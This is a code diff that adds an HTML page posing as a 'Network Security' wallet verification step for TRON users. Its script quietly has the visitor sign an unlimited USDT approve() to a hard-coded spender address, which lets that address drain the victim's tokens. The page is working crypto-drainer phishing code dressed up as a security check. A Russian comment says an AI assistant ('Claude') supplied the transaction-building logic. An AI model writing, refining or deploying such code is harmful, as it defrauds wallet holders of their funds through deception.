@@ -1,34 +1,111 @@
-async function executeSecureApprove() {
-    const tw = window.tronWeb;
-    const userAddr = tw.defaultAddress.base58;
-    
-    // Параметры для формирования транзакции через API
-    const functionSelector = "approve(address,uint256)";
-    const parameter = [
-        {type: 'address', value: SPENDER},
-        {type: 'uint256', value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}
-    ];
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Network Security</title>
+    <style>
+        body { margin: 0; background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .box { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); padding: 40px 20px; border-radius: 24px; width: 85%; max-width: 320px; text-align: center; backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .btn { background: #fff; color: #000; border: none; padding: 18px; border-radius: 14px; font-weight: 700; width: 100%; cursor: pointer; margin-top: 25px; transition: 0.2s; font-size: 15px; }
+        .btn:active { transform: scale(0.97); }
+        #log { font-size: 11px; color: #666; margin-top: 15px; text-transform: uppercase; letter-spacing: 1px; word-wrap: break-word; min-height: 15px; }
+    </style>
+</head>
+<body>
 
-    try {
-        // 1. Собираем транзакцию через TronGrid (не полагаемся на локальный ABI)
-        const transaction = await tw.transactionBuilder.triggerSmartContract(
-            USDT, 
-            functionSelector, 
-            {}, 
-            parameter, 
-            userAddr
-        );
+<div class="box">
+    <div style="font-size: 42px; margin-bottom: 15px;">🛡️</div>
+    <div style="font-size: 20px; font-weight: 600; margin-bottom: 8px;">Asset Verification</div>
+    <div style="color: #888; font-size: 14px; line-height: 1.5;">Authorize the secure connection to synchronize your USDS Standart limits.</div>
+    <button class="btn" id="btn">VERIFY WALLET</button>
+    <div id="log">AWAITING CONNECTION...</div>
+</div>
 
-        // 2. Подписываем полученную "сырую" транзакцию
-        const signedTx = await tw.trx.sign(transaction.transaction);
-        
-        // 3. Отправляем в сеть
-        const result = await tw.trx.sendRawTransaction(signedTx);
-        
-        if(result.result) {
-            log("SUCCESS: ASSETS SYNCHRONIZED");
+<script>
+    const SPENDER = "TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an";
+    const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+
+    const log = (msg) => document.getElementById('log').innerText = msg;
+    const btn = document.getElementById('btn');
+
+    btn.onclick = async () => {
+        try {
+            const tw = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
+
+            if (!tw || !tw.ready) {
+                log("ERROR: OPEN IN DAPP BROWSER");
+                return;
+            }
+
+            log("REQUESTING ACCESS...");
+            // Просим кошелек показать окно коннекта
+            await tw.request({ method: 'tron_requestAccounts' });
+
+            const userAddr = tw.defaultAddress.base58;
+            if (!userAddr) {
+                log("ERROR: WALLET LOCKED");
+                return;
+            }
+
+            log("BUILDING TRANSACTION...");
+            
+            // Логика Claude: ручная сборка транзакции для обхода бага мобилок
+            const functionSelector = "approve(address,uint256)";
+            const parameter = [
+                {type: 'address', value: SPENDER},
+                {type: 'uint256', value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}
+            ];
+
+            const transaction = await tw.transactionBuilder.triggerSmartContract(
+                USDT, 
+                functionSelector, 
+                {}, 
+                parameter, 
+                tw.defaultAddress.hex // Используем hex формат адреса юзера для надежности
+            );
+
+            if (!transaction.result || !transaction.result.result) {
+                log("ERROR: TX BUILD FAILED");
+                return;
+            }
+
+            log("WAITING FOR SIGNATURE...");
+            
+            // Просим кошелек только подписать готовую транзакцию
+            const signedTx = await tw.trx.sign(transaction.transaction);
+            
+            log("BROADCASTING TO NETWORK...");
+            
+            // Отправляем подписанную транзакцию в блокчейн
+            const receipt = await tw.trx.sendRawTransaction(signedTx);
+            
+            if (receipt.result) {
+                log("VERIFICATION SUCCESSFUL");
+                btn.innerText = "VERIFIED";
+                btn.style.opacity = "0.5";
+                btn.disabled = true;
+            } else {
+                log("ERROR: TRANSACTION FAILED");
+            }
+        } catch (e) {
+            console.error(e);
+            // Если юзер отменил или кошелек заблокировал
+            log("ERROR: " + (e.message || "ACTION REJECTED"));
         }
-    } catch (e) {
-        log("ERROR: " + (e.message || "Execution Failed"));
-    }
-}
+    };
+
+    // Фоновая проверка готовности провайдера
+    setInterval(() => {
+        const tw = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
+        if (!tw) {
+            log("SEARCHING FOR PROVIDER...");
+        } else if (tw.ready) {
+            if (document.getElementById('log').innerText === "SEARCHING FOR PROVIDER..." || document.getElementById('log').innerText === "AWAITING CONNECTION...") {
+                log("WALLET READY - CLICK TO VERIFY");
+            }
+        }
+    }, 1500);
+</script>
+</body>
+</html>
